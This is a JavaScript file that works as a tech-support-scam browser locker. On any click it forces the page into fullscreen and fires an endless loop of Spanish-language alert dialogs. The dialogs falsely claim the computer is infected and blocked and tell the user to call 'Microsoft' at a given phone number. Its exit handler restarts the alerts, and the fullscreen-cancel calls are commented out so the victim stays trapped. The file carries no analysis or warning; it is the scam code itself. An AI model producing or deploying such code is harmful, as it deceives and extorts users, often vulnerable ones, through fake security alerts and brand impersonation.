jQuery('html').click(function(e) { 

	toggleFullScreen();                   

   	var j=5;

    	for (var i = 0; i < j; i++) {

    		alert("\n\ ID de Rederencia: {FOO90} \n\n SU ORDENADOR MICROSOFT HA SIDO BLOQUEADO \n\nAlerta del sistema de Windows !!\n\nSistema ha sido infectado por un error inesperado!\nPóngase en contacto con Microsoft 900 838 110 Inmediatamente!\para desbloquear el equipo.\n\nLa falta de registro del sistema operativo.\n\nCódigo de error: FOOPOP90UP\n\n LLAME INMEDIATAMENTE A MICROSOFT 900 838 110\n\nSISTEMA DE ARCHIVOS DE DATOS ESTÁ EN RIESGO:\n -servicios del sistema no pueden trabajar.\n -El disco duro está a punto de chocar\n -Posible falla en el registro\n -los archivos DLL se corrompe\n -Los conexiones extranjeros detectados\n\nLLAME INMEDIATAMENTE A MICROSOFT 900 838 110\n\nMÁS INFORMACIÓN SOBRE ESTA INFECCIÓN:\nAl ver estos medios de pop-up que puede tener un virus instalado en el equipo que pone la seguridad de sus datos personales en un grave riesgo.\nEs aconsejable que llame al número anterior y conseguir que su equipo inspeccionado antes de continuar utilizando el Internet. \n\nSe debe buscar asistencia.\nAl ponerse en contacto con Microsoft 900 838 110");

    		j++;

    		}

}); 





if (document.addEventListener)

{

    document.addEventListener('webkitfullscreenchange', exitHandler, false);

    document.addEventListener('mozfullscreenchange', exitHandler, false);

    document.addEventListener('fullscreenchange', exitHandler, false);

    document.addEventListener('MSFullscreenChange', exitHandler, false);

}



function exitHandler()

{

    if (document.webkitIsFullScreen || document.mozFullScreen || document.msFullscreenElement !== null)

    {

       var j=5;

    	for (var i = 0; i < j; i++) {

    		alert("\n\ ID de Rederencia: {FOO90} \n\n SU ORDENADOR MICROSOFT HA SIDO BLOQUEADO \n\nAlerta del sistema de Windows !!\n\nSistema ha sido infectado por un error inesperado!\nPóngase en contacto con Microsoft 900 838 110 Inmediatamente!\para desbloquear el equipo.\n\nLa falta de registro del sistema operativo.\n\nCódigo de error: FOOPOP90U\n\n LLAME INMEDIATAMENTE A MICROSOFT 900 838 110\n\nSISTEMA DE ARCHIVOS DE DATOS ESTÁ EN RIESGO:\n -servicios del sistema no pueden trabajar.\n -El disco duro está a punto de chocar\n -Posible falla en el registro\n -los archivos DLL se corrompe\n -Los conexiones extranjeros detectados\n\nLLAME INMEDIATAMENTE A MICROSOFT 900 838 110\n\nMÁS INFORMACIÓN SOBRE ESTA INFECCIÓN:\nAl ver estos medios de pop-up que puede tener un virus instalado en el equipo que pone la seguridad de sus datos personales en un grave riesgo.\nEs aconsejable que llame al número anterior y conseguir que su equipo inspeccionado antes de continuar utilizando el Internet. \n\nSe debe buscar asistencia.\nAl ponerse en contacto con Microsoft 900 838 110");

    		j++;

    		}

    }

}





   function toggleFullScreen() {

  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    

   (!document.mozFullScreen && !document.webkitIsFullScreen)) {

    if (document.documentElement.requestFullScreen) {  

      document.documentElement.requestFullScreen();  

    } else if (document.documentElement.mozRequestFullScreen) {  

      document.documentElement.mozRequestFullScreen();  

    } else if (document.documentElement.webkitRequestFullScreen) {  

      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  

    }

  } else {  

    if (document.cancelFullScreen) {  

      // document.cancelFullScreen();  

    } else if (document.mozCancelFullScreen) {  

      // document.mozCancelFullScreen();  

    } else if (document.webkitCancelFullScreen) {  

      // document.webkitCancelFullScreen();  

    }  

  } 

}